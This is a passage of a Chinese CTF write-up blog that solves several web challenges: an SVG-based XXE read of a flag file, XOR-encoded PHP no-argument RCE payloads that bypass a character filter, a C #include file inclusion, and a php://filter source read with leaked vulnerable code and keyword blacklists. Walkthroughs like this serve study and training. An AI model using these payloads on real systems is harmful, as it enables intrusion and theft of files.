class="string">&#x27;FLAG1&#x27;</span>) . <span class="string">&#x27;&lt;/code&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且又要求getimagesize()获取到图片信息中不能为png图片 这样才会给我们flag</p><p>所以总结一下就是要求我们 finfo_file()获取到mine为png图片 但是getimagesize()获取到图片信息又不能为png图片</p><p>所以这样很明显我们需要绕过getimagesize()也就是让<code>$size[2] !== IMAGETYPE_PNG</code>这个条件成立</p><p>问一下gpt</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578140917-e7bfeac6-bd41-4084-91de-0ac3d3137d68.png" alt="img"></p><p>我们可以让getimagesize()函数在获取图片信息的时候让其出错 从而使得这个条件成立 成功bypass</p><p>随便找一个符合其他条件的png 图片</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578241021-d8677a96-be39-441b-80ea-27bfc18677cb.png" alt="img"></p><p>将除了第一行以外的其他信息全部删除生成一张png图片</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578269747-e962712b-9a68-4004-adde-9f8db3b60f18.png" alt="img"></p><p>这样只有文件头部是正常的getimagesize()获取不到图片的其他信息从而出错</p><p>成功！</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578387080-53ad022c-e65d-4003-887e-d1d92ceab8d4.png" alt="img"></p><h1 id="114、-BSidesCF-2019-SVGMagic"><a href="#114、-BSidesCF-2019-SVGMagic" class="headerlink" title="114、[BSidesCF 2019]SVGMagic"></a>114、[BSidesCF 2019]SVGMagic</h1><p>SVG是Scalable Vector Graphics的缩写,意为可缩放向量图形。它是一种使用XML描述2D图形的图像文件格式。</p><p>也就是说SVG是XML文件  </p><p>那么说到xml 立马就能想到xxe 如果我们在svg图像中插入xxe恶意代码呢 </p><p>直接偷师傅的payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?x</span>ml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="string">?&gt;</span></span><br><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> note [</span><br><span class="line">&lt;!<span class="variable constant_">ENTITY</span> file <span class="variable constant_">SYSTEM</span> <span class="string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=<span class="string">&quot;100&quot;</span> width=<span class="string">&quot;1000&quot;</span>&gt;</span><br><span class="line">  &lt;text x=<span class="string">&quot;10&quot;</span> y=<span class="string">&quot;20&quot;</span>&gt;&amp;file;&lt;<span class="regexp">/text&gt;</span></span><br><span class="line"><span class="regexp">&lt;/svg</span>&gt;</span><br></pre></td></tr></table></figure><p>这里要注意的是：</p><p>一般我们进行xxe的时候，定义了外部实体还要通过<code>&amp;</code>来调用这个实体，但是这道题目不需要 只需要上传上去之后他会执行 然后再把结果反馈到png图像中  可能这就是render的魅力吧:)</p><p>这道题目flag文件不知道在哪里</p><p><code>/proc/self/cwd</code>表示当前路径 <code>/proc/self/root</code>表示的是<code>/</code>根目录</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689579753906-b0e3ebde-2b81-4cb3-a9f0-63176d7ea6fc.png" alt="img"></p><h1 id="115、-ISITDTU-2019-EasyPHP"><a href="#115、-ISITDTU-2019-EasyPHP" class="headerlink" title="115、[ISITDTU 2019]EasyPHP"></a>115、[ISITDTU 2019]EasyPHP</h1><p>一道奇淫rce构造rce的题目 其实就是异或构造+无参rce</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">highlight_file(<span class="variable constant_">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    die(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    die(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line">eval(<span class="variable">$_</span>);</span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>正则waf了这些</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689584978289-6c38ec2a-8a6f-4cf9-bac3-a3d6e45ad99b.png" alt="img"></p><p>再来看看这部分：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    die(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br></pre></td></tr></table></figure><p>strtolower:将我们输入的内容转为小写</p><p>count_chars:返回字符串所用字符的信息</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689585086139-4169ecf7-ab7b-45b8-86fc-f94a956ea8d4.png" alt="img"></p><p>这里模式为3所以返回所有使用了的字节值组成的字符串</p><p>strlen:获取字符串长度</p><p>所以整个这一部分就是计算我们输入字符串字符类型个数 获取我们总共输入了几种字符</p><p>看了这道题的wp 主要是很麻烦 核心就是通过异或来构造webshell</p><p><strong>这里有个小tips 一般我们构造异或payload的时候都是与</strong><code>%ff</code><strong>异或来获取字符的</strong></p><p>一个简单的demo理解异或构造</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(<span class="variable">@a</span>^<span class="string">&quot;1&quot;</span>);</span><br><span class="line">string(<span class="number">1</span>) <span class="string">&quot;P&quot;</span></span><br><span class="line">php &gt; echo ord(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="number">97</span></span><br><span class="line">php &gt; echo ord(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="number">49</span></span><br><span class="line">php &gt; echo <span class="number">97</span>^<span class="number">49</span>;</span><br><span class="line"><span class="number">80</span></span><br><span class="line">php &gt; echo chr(<span class="number">80</span>);</span><br><span class="line">P</span><br></pre></td></tr></table></figure><p>那么问题是97^49为什么是80呢 </p><p>其实是十进制先转为二进制 然后两个数的每一位二进制之间进行异或得到的数再转为十进制就是结果</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">01100001</span> <span class="comment">#97二进制</span></span><br><span class="line"><span class="number">00110001</span> <span class="comment">#49二进制</span></span><br><span class="line"><span class="number">01010000</span> <span class="comment">#按位异或</span></span><br></pre></td></tr></table></figure><p>可见这个结果就是十进制的80</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689585887772-568d3234-ea97-458e-9479-d40477f308b3.png" alt="img"></p><p>看了这篇文章还是很不错的<a href="https://xz.aliyun.com/t/5677#toc-1">https://xz.aliyun.com/t/5677#toc-1</a></p><p>里面还有通过非<code>！</code>来进行构造数字payload 真的tql</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(@<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(@!<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(@!!<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(@!!<span class="string">&#x27;a&#x27;</span>+@!!<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586290324-cb408fc9-2f9f-4667-8971-6bec93fef49b.png" alt="img"></p><p>成功构造出数字2</p><p>然后这道题目就是会限制我们的字符类型要在13以内 就是要去找别的字符来减少payload 这点很麻烦</p><p>其次就是无参rce</p><p>构造<code>print_r(scandir(.))</code>来找flag文件</p><p>paylaod:<code>((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));</code>但是里面的字符类型超过13了</p><p>利用已经存在的字符异或来替换减少字符类型</p><p>查找可以替换的字符</p><p>a &#x3D; c^p^r </p><p>d &#x3D; s^c^t </p><p>n &#x3D; i^s^t</p><p>每个替换字符再与%ff异或一下</p><p>得到：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586916100-cb946524-270b-4b18-a5bc-5f0df59a7c1f.png" alt="img"></p><p>最后构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%96%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%8c%ff%ff%ff)^(%ff%ff%ff%8b%ff%ff%ff))(((%8c%9c%9c%96%8c%96%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%8f%8c%9c%ff%ff)^(%ff%ff%8d%8b%8b%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><p>发现flag文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586959408-c62cf98f-999c-4bf5-b00a-071047f80595.png" alt="img"></p><p>再构造： <code>readfile(end(scandir(.)))</code> 思路和上面一样</p><p>payload:<code>((%8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff)));</code></p><p>参考：<a href="https://www.shawroot.cc/1209.html">https://www.shawroot.cc/1209.html</a> payload都是偷的这个大佬的qaq</p><h1 id="116、-FireshellCTF2020-Caas"><a href="#116、-FireshellCTF2020-Caas" class="headerlink" title="116、[FireshellCTF2020]Caas"></a>116、[FireshellCTF2020]Caas</h1><p>一个c语言文件包含的题目 新奇</p><p>一开始以为是php环境或者python 然后搜索报错信息之后返现是c语言</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689589242051-f7b75cce-acff-450e-b3d1-cb3da4fe2d1c.png" alt="img"></p><p>payload:<code>#include &quot;/flag&quot;</code></p><h1 id="117、-N1CTF-2018-eating-cms"><a href="#117、-N1CTF-2018-eating-cms" class="headerlink" title="117、[N1CTF 2018]eating_cms"></a>117、[N1CTF 2018]eating_cms</h1><p>考点：parse_url解析漏洞</p><p>首先在<code>/register.php</code>下申请一个账号 老套路了 然后登录</p><p>然后看了下请求的网址 很像任意文件读取url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user.php?page=php://filter/read=convert.base64-encode/resource=info</span><br></pre></td></tr></table></figure><p>用伪协议读一下 得到以下内容</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] ))&#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: user.php?page=info&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;templates/index.html&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>( !<span class="keyword">isset</span>( <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] ))&#123;</span><br><span class="line">  <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">  <span class="variable">$oper_you_can_do</span> = <span class="variable">$OPERATE_admin</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="variable">$oper_you_can_do</span> = <span class="variable">$OPERATE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) || <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])|| <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$page</span> === <span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span></span><br><span class="line">      <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: user.php?page=guest&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">filter_directory</span>();</span><br><span class="line"><span class="comment">//if(!in_array($page,$oper_you_can_do))&#123;</span></span><br><span class="line"><span class="comment">//    $page = &#x27;info&#x27;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$page</span>.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>info.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;templates/info.html&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: hacker.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>,<span class="string">&quot;info&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="string">&quot;<span class="subst">$whitelist</span>&quot;</span>, <span class="variable">$string</span>[<span class="variable">$i</span>]) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">Hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$blacklist</span>/is&quot;</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Hacker</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$string</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span>(<span class="params"><span class="variable">$sql_query</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql_query</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">Filter</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span>-&gt;num_rows) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$data</span>[username_which_you_do_not_know];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] = <span class="variable">$data</span>[isadmin_which_you_do_not_know_too_too];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span 